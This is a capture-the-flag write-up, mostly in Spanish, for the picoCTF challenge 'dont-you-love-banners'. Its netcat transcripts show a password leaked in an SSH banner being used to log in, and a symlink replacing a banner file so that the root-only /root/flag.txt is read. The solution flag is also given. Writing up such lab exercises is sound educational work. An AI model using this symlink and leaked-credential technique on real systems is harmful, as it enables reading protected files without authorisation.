# dont-you-love-banners

## Descripción

Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 52968`.

Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 53677`. 

From the above information abuse the machine and find the flag in the /root directory.
## Solución

```

└─$ nc tethys.picoctf.net 52968
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234


└─$ nc tethys.picoctf.net 53677
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234

#Buscamos la respuesta a las preguntas en internet
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper 
player@challenge:~$

#Borramos el enlace "banner" y creamos uno nuevo en lugar del script.py a la flag.txt

player@challenge:~$ rm /home/player/banner
rm /home/player/banner
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner

#Y nos muestra el archivo txt en lugar de correr el script

└─$ nc tethys.picoctf.net 57462
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}
```

picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}
## Notas adicionales

Usamos symlinks para mostrar un archivo del cual no tenemos permisos para leer.
## Referencias

https://www.freecodecamp.org/espanol/news/tutorial-de-symlink-en-linux-como-crear-y-eliminar-un-enlace-simbolico/